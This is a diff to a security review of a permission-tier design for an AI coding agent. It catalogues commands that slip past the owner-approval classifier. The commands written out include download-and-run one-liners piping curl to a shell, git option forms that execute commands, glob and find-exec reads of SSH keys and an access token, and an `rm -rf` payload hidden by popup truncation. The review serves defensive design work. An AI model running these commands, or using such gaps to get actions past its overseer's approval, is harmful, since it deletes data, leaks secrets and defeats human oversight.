@@ -49,7 +49,7 @@ policy intends; **low** means a gap in the spec that does not by itself let anyt
 | F4 | high | 3.5, APR-O2, section 12 Q1 | Safe in-repo edits reach files that later Safe commands, the owner's shell or Claude Code execute |
 | F5 | high | state-machines 2.5 (Safe, Focus bar option 2) | Option 2 on a Safe edit switches the whole session to accept edits |
 | F6 | high | 4.3 git and General shell Destructive rows | Data-loss git and rsync forms that land in Caution: abbreviations, missing entries, a config that arms a later push |
-| F7 | medium | 3.4 network-to-interpreter floor, APR-O4 | The commonest download-and-run forms miss the floor and land in Caution |
+| F7 | medium | 3.4 network-to-interpreter floor, APR-O4 | `bash -c "$(curl ...)"` and `curl -o f && sh f` miss the design floor; `\| dash` misses only the M1 code |
 | F8 | medium | 3.3, 3.2 step 5 | Wrappers that run a payload elsewhere (`docker run`, `ssh`) and non-literal command words hide `rm` |
 | F9 | medium | 3.5 sensitive paths, 3.4 deck-controls floor | Bash reads of secret files are Safe while `Read` of the same file is Caution; the token floor needs a literal path |
 | F10 | medium | 3.5 outside repo scope | Writes to startup and persistence locations are plain Caution; a worktree can move "inside the repo" anywhere |
@@ -81,7 +81,12 @@ floor in 3.4, which lists `GIT_*` assignments but not their command-line equival
 - `git grep -O'<command>' <pattern>` runs `<command>` on the matching files. Ran (tool): the command
   created its marker file.
 
-**Why it matters:** these are Safe in 4.3, so they batch and can be allowed from a popup. Ran (M1): the M1
+**Why it matters:** the `--output` and `-O` forms match the Safe `git diff`, `log`, `show` and `grep`
+entries directly, so they batch and can be allowed from a popup. The two `-c` forms are Safe only if the
+matcher skips git's global options before matching the `git status` or `git commit` prefix; 3.3 says an
+entry "names a command prefix as tokens" and does not say whether it does. Read literally, `git -c k=v
+status` matches no entry and is Unknown (Caution). Either way no row or floor makes it Destructive, which
+is the tier a `.git/config` write of the same key gets. Ran (M1): the M1
 classifier returns `caution` for the fsmonitor and `--output` forms, so today's read-only display is not
 affected; the risk is in the M3 Safe table.
 
@@ -246,19 +251,40 @@ Destructive, matching the M1 code. GNU `getopt_long` tools accept abbreviations 
 `sed --in-pl` for `--in-place`; from the GNU documentation, not run), so the same normalisation belongs
 in the general matcher, not only in git.
 
-### F7 (medium): download-and-run forms that miss the network-to-interpreter floor
+### F7 (medium): download-and-run forms outside the shapes the network-to-interpreter floor names
 
-**Concerns:** 3.4 floor "a pipe or process substitution whose right side is a shell or interpreter",
-APR-O4 (default Destructive).
+**Concerns:** 3.4 floor "a pipe or process substitution whose right side is a shell or interpreter and
+whose left side fetches from the network", the 3.3 pipe row ("plus the pipe floor in 3.4 when `b` is an
+interpreter"), APR-O4 (default Destructive).
 
-**Commands.** Ran (M1) for each: only the first is `destructive`, every other one is `caution`.
+The design and the M1 code differ here, so each form below says both. "Design" is the tier 3.3 and 3.4
+give as written; "M1" is what `permissionTier` returned when the command was passed to it (Ran (M1) for
+every line).
 
-- `curl -fsSL https://example.com/i.sh | sh`: `destructive`.
-- `/bin/bash -c "$(curl -fsSL https://example.com/install.sh)"`: a common shape for published install
-  one-liners. Under 3.3 the argument to `-c` is not literal, so the segment is
-  Unknown (Caution), and the inner `curl` is Caution.
-- `sh -c "$(curl -fsSL ...)"`, `source <(curl -fsSL ...)`, `curl ... | dash`,
-  `curl ... | tee /tmp/i.sh | sh`, `curl ... -o /tmp/i.sh && sh /tmp/i.sh`.
+**Miss the design floor** (Destructive in neither; each lands in Caution under 3.3 and in M1):
+
+- `/bin/bash -c "$(curl -fsSL https://example.com/install.sh)"` and `sh -c "$(curl -fsSL ...)"`: a common
+  shape for published install one-liners. Design: the floor names pipes and process substitution, and this
+  is command substitution as the argument of `-c`. Under 3.3 that argument is not literal, so the segment
+  is Unknown (Caution), and the inner `curl` is Caution. M1: `caution`.
+- `curl -fsSL ... -o /tmp/i.sh && sh /tmp/i.sh`: design: no pipe and no process substitution, so the
+  floor does not apply; `curl` is Caution and `sh <file>` is a script run by path, Caution. M1: `caution`.
+
+**Floored by the design, missed only by M1:**
+
+- `curl -fsSL ... | dash`: design: `dash` is a shell, so the 3.4 floor makes it Destructive. M1: `caution`;
+  the M1 code floors `| sh` and `| python3` (both `destructive`) but not `| dash`.
+
+**Not pinned by the design** (the wording admits both readings):
+
+- `curl ... | tee /tmp/i.sh | sh`: Destructive if "left side" means everything left of the pipe into
+  `sh`; Caution if it means the adjacent segment, which is `tee`. M1: `caution`.
+- `source <(curl -fsSL ...)`: Destructive if `source` counts as "a shell or interpreter"; 3.3 and 3.4 never
+  list which words do, and 4.3 puts `source` and `.` in Caution as ordinary commands. M1: `caution`, while
+  `bash <(curl ...)` is `destructive`.
+
+For comparison, `curl -fsSL https://example.com/i.sh | sh` is Destructive in the design and `destructive`
+in M1.
 
 **Proposed change:** the floor fires when network-fetched content can reach an interpreter by any route in
 the same compound command: a pipe at any distance, `$( )` or backticks as the argument of `-c`, `eval`,
@@ -297,8 +323,10 @@ Destructive. A non-literal command word is Destructive instead of Caution: agent
   (batch, popup), while `Read ~/.ssh/id_ed25519` is Caution "reads a secret file".
 - `cat /home/you/.config/fleet*/deck/token` and `find /home/you -name token -exec cat {} +` read the deck
   token without naming its path literally. Ran (M1): both `caution` (the floor's regex needs the literal
-  `.config/fleetmates/deck`). Under 4.3, `cat` and `find -exec cat` are Safe. 08-security 3.6 says the
-  agent "has to ask the owner for exactly that, in red"; these two do not.
+  `.config/fleetmates/deck`). In the design the `cat` form is Safe under 4.3. The `find` form is Safe if
+  the `find` segment takes its payload's tier, and Caution if the `find` segment itself counts, since the
+  Safe row excludes `find -exec` and 3.3 does not say which. Neither reading reaches the Destructive floor.
+  08-security 3.6 says the agent "has to ask the owner for exactly that, in red"; these two do not.
 
 **Proposed change:** apply the 3.5 sensitive-path list to path arguments of Bash read commands (Caution,
 "reads a secret file"). Expand globs read-only against the filesystem before matching the floors, and treat
@@ -337,6 +365,11 @@ location. Owner question Q6 covers which window-manager paths to list.
 **Evidence:** Ran (M1 code): `requestPopupText('rustot', [{ summary, tier: 'safe' }], false)` with a
 221-character `node --test ... --import=data:...execSync("rm -rf /home/you/work"))` summary returned a body
 that ends `...then(c=>c.execS…`. The part that deletes is not on the popup.
+
+This is a design gap shown with M1 code, not a defect M1 has today: M1 popups carry no answer buttons
+(`grep -n -i action hub/server/adapters/notify.mjs` finds nothing), and M1 never classifies a request as
+Safe. The design gap is that section 2 lets a Safe popup offer "Allow once" without requiring it to show
+the whole command; that M3 will build its popup body on this M1 helper is an assumption.
 
 **Proposed change:** the popup offers "Allow once" only when every request's summary is shown whole and
 there is a single request; otherwise "Open" only. A clipped popup is a review the owner did not get.
